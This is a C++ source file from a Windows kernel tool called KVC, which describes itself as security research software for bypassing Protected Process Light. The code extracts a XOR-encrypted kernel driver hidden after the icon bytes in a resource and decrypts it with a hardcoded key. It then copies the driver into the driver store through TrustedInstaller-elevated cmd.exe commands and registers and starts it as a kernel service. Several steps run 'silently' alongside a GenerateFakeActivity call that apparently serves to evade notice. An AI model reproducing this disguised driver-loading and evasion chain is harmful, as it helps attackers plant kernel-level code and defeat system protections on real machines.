/*******************************************************************************
  _  ____     ______ 
 | |/ /\ \   / / ___|
 | ' /  \ \ / / |    
 | . \   \ V /| |___ 
 |_|\_\   \_/  \____|

The **Kernel Vulnerability Capabilities (KVC)** framework represents a paradigm shift in Windows security research, 
offering unprecedented access to modern Windows internals through sophisticated ring-0 operations. Originally conceived 
as "Kernel Process Control," the framework has evolved to emphasize not just control, but the complete **exploitation 
of kernel-level primitives** for legitimate security research and penetration testing.

KVC addresses the critical gap left by traditional forensic tools that have become obsolete in the face of modern Windows 
security hardening. Where tools like ProcDump and Process Explorer fail against Protected Process Light (PPL) and Antimalware 
Protected Interface (AMSI) boundaries, KVC succeeds by operating at the kernel level, manipulating the very structures 
that define these protections.

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

*******************************************************************************/

// ControllerDriverManager.cpp
#include "Controller.h"
#include "common.h"
#include "Utils.h"
#include "resource.h"
#include <filesystem>

namespace fs = std::filesystem;

// Driver service lifecycle management
bool Controller::StopDriverService() noexcept {
    DEBUG(L"StopDriverService called");
    
    if (!InitDynamicAPIs()) {
        DEBUG(L"InitDynamicAPIs failed in StopDriverService");
        return false;
    }
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) {
        DEBUG(L"OpenSCManagerW failed: %d", GetLastError());
        return false;
    }

    SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hService) {
        DWORD err = GetLastError();
        CloseServiceHandle(hSCM);
        
        if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
            DEBUG(L"Service does not exist - considered stopped");
            return true;
        }
        
        DEBUG(L"OpenServiceW failed: %d", err);
        return false;
    }

    SERVICE_STATUS status;
    if (QueryServiceStatus(hService, &status)) {
        if (status.dwCurrentState == SERVICE_STOPPED) {
            DEBUG(L"Service already stopped");
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return true;
        }
    }

    SERVICE_STATUS stopStatus;
    BOOL success = g_pControlService(hService, SERVICE_CONTROL_STOP, &stopStatus);
    DWORD err = GetLastError();

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    DEBUG(L"ControlService result: %d, error: %d", success, err);
    
    return success || err == ERROR_SERVICE_NOT_ACTIVE;
}

// Extract driver from steganographic icon resource
std::vector<BYTE> Controller::ExtractEncryptedDriver() noexcept {
    auto iconData = Utils::ReadResource(IDR_MAINICON, RT_RCDATA);
    if (iconData.size() <= 9662) {
        ERROR(L"Icon resource too small or corrupted - steganographic driver missing");
        return {};
    }
    // Skip first 9662 bytes (actual icon data) to get embedded driver
    return std::vector<BYTE>(iconData.begin() + 9662, iconData.end());
}

// Decrypt embedded driver using XOR cipher
// Decrypt embedded driver using XOR cipher
std::vector<BYTE> Controller::DecryptDriver(const std::vector<BYTE>& encryptedData) noexcept {
    if (encryptedData.empty()) {
        ERROR(L"No encrypted driver data provided");
        return {};
    }

    constexpr std::array<BYTE, 7> key = { 0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C };
    std::vector<BYTE> decryptedData = encryptedData;
    
    // Simple XOR decryption with repeating key
    for (size_t i = 0; i < decryptedData.size(); ++i) {
        decryptedData[i] ^= key[i % key.size()];  // Use 'key' instead of 'decryptionKey'
    }
    
    return decryptedData;
}

// Silent driver installation with TrustedInstaller privileges
bool Controller::InstallDriverSilently() noexcept {
    auto encryptedData = ExtractEncryptedDriver();
    if (encryptedData.empty()) return false;
    
    auto driverData = DecryptDriver(encryptedData);
    if (driverData.empty()) return false;

    fs::path tempDir = GetSystemTempPath(); // Use system temp instead of user temp
    fs::path tempDriverPath = tempDir / fs::path(GetDriverFileName());
    
    if (!Utils::WriteFile(tempDriverPath.wstring(), driverData)) return false;

    fs::path driverDir = GetDriverStorePath();
    fs::path driverPath = driverDir / fs::path(GetDriverFileName());

    // Copy with system privileges
    std::wstring copyCommand = L"cmd.exe /c copy /Y \"" + tempDriverPath.wstring() + L"\" \"" + driverPath.wstring() + L"\"";
    if (!RunAsTrustedInstallerSilent(copyCommand)) {
        DeleteFileW(tempDriverPath.c_str());
        return false;
    }

    DeleteFileW(tempDriverPath.c_str());
    
    // REGISTER THE SERVICE WITH CORRECT PRIVILEGES
    return RegisterDriverServiceSilent(driverPath.wstring());
}

bool Controller::RegisterDriverServiceSilent(const std::wstring& driverPath) noexcept {
    if (!InitDynamicAPIs()) return false;
    GenerateFakeActivity();
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;

    SC_HANDLE hService = g_pCreateServiceW(
        hSCM, 
        GetServiceName().c_str(), 
        L"Kernel Driver Service",
        SERVICE_ALL_ACCESS, 
        SERVICE_KERNEL_DRIVER,  // KEY CHANGE: type = kernel
        SERVICE_DEMAND_START,   // start = demand (can be changed to auto)
        SERVICE_ERROR_NORMAL, 
        driverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    );

    bool success = (hService != nullptr) || (GetLastError() == ERROR_SERVICE_EXISTS);
    
    if (hService) CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return success;
}

bool Controller::StartDriverServiceSilent() noexcept {
    if (!InitDynamicAPIs()) return false;
    GenerateFakeActivity();
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;

    SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }

    SERVICE_STATUS status;
    bool success = true;
    
    if (QueryServiceStatus(hService, &status)) {
        if (status.dwCurrentState != SERVICE_RUNNING) {
            success = g_pStartServiceW(hService, 0, nullptr) || (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING);
        }
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return success;
}

// Legacy driver installation with enhanced error handling
bool Controller::InstallDriver() noexcept {
    auto encryptedData = ExtractEncryptedDriver();
    if (encryptedData.empty()) {
        ERROR(L"Failed to extract encrypted driver from icon resource");
        return false;
    }
    
    auto driverData = DecryptDriver(encryptedData);
    if (driverData.empty()) {
        ERROR(L"Failed to decrypt embedded driver data");
        return false;
    }

    fs::path tempDir = fs::temp_directory_path();
    fs::path tempDriverPath = tempDir / fs::path(GetDriverFileName());
    
    if (!Utils::WriteFile(tempDriverPath.wstring(), driverData)) {
        ERROR(L"Failed to write driver file to temp location: %s", tempDriverPath.c_str());
        return false;
    }

    fs::path driverDir = GetDriverStorePath();
    fs::path driverPath = driverDir / fs::path(GetDriverFileName());

    std::error_code ec;
    fs::create_directories(driverDir, ec);
    if (ec) {
        INFO(L"Directory creation failed (may already exist)");
    }

    std::wstring copyCommand = L"cmd.exe /c copy /Y " + tempDriverPath.wstring() + L" " + driverPath.wstring();
    INFO(L"Copying driver with elevated privileges: %s", copyCommand.c_str());

    if (!RunAsTrustedInstaller(copyCommand)) {
        ERROR(L"Failed to copy driver to system directory with elevated privileges");
        DeleteFileW(tempDriverPath.c_str());
        return false;
    }

    if (!fs::exists(driverPath)) {
        ERROR(L"Driver file was not copied successfully to: %s", driverPath.c_str());
        DeleteFileW(tempDriverPath.c_str());
        return false;
    }

    SUCCESS(L"Driver file successfully copied to: %s", driverPath.c_str());
    DeleteFileW(tempDriverPath.c_str());

    if (!InitDynamicAPIs()) return false;
    GenerateFakeActivity();
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        ERROR(L"Failed to open service control manager: %d", GetLastError());
        return false;
    }

    SC_HANDLE hService = g_pCreateServiceW(
        hSCM, GetServiceName().c_str(), L"Memory Access Driver",
        SERVICE_ALL_ACCESS, 
        SERVICE_KERNEL_DRIVER,  // KEY CHANGE
        SERVICE_DEMAND_START,   // start= demand
        SERVICE_ERROR_NORMAL, driverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    );

    if (!hService) {
        DWORD err = GetLastError();
        CloseServiceHandle(hSCM);
        
        if (err != ERROR_SERVICE_EXISTS) {
            ERROR(L"Failed to create driver service: %d", err);
            return false;
        }
        
        INFO(L"Driver service already exists, proceeding");
    } else {
        CloseServiceHandle(hService);
        SUCCESS(L"Driver service created successfully");
    }

    CloseServiceHandle(hSCM);
    SUCCESS(L"Driver installed and registered as Windows service");
    return true;
}

bool Controller::UninstallDriver() noexcept {
    StopDriverService();

    if (!InitDynamicAPIs()) return true;

    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        return true;
    }

    std::wstring serviceName = GetServiceName();
    SC_HANDLE hService = g_pOpenServiceW(hSCM, serviceName.c_str(), DELETE);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return true;
    }

    BOOL success = g_pDeleteService(hService);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    if (!success) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_MARKED_FOR_DELETE) {
            ERROR(L"Failed to delete driver service: %d", err);
            return false;
        }
    }

    // Clean up driver file
    fs::path driverDir = GetDriverStorePath();
    fs::path driverPath = driverDir / fs::path(GetDriverFileName());
    
    std::error_code ec;
    if (!fs::remove(driverPath, ec)) {
        if (ec.value() != ERROR_FILE_NOT_FOUND) {
            std::wstring delCommand = L"cmd.exe /c del /Q \"" + driverPath.wstring() + L"\"";
            RunAsTrustedInstallerSilent(delCommand);
        }
    }

    return true;
}

bool Controller::StartDriverService() noexcept {
    if (!InitDynamicAPIs()) return false;
    GenerateFakeActivity();
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        ERROR(L"Failed to open service control manager: %d", GetLastError());
        return false;
    }

    SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        ERROR(L"Failed to open kernel driver service: %d", GetLastError());
        return false;
    }

    SERVICE_STATUS status;
    if (QueryServiceStatus(hService, &status)) {
        if (status.dwCurrentState == SERVICE_RUNNING) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            INFO(L"Kernel driver service already running");
            return true;
        }
    }

    BOOL success = g_pStartServiceW(hService, 0, nullptr);
    DWORD err = GetLastError();

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    if (!success && err != ERROR_SERVICE_ALREADY_RUNNING) {
        ERROR(L"Failed to start kernel driver service: %d", err);
        return false;
    }

    SUCCESS(L"Kernel driver service started successfully");
    return true;
}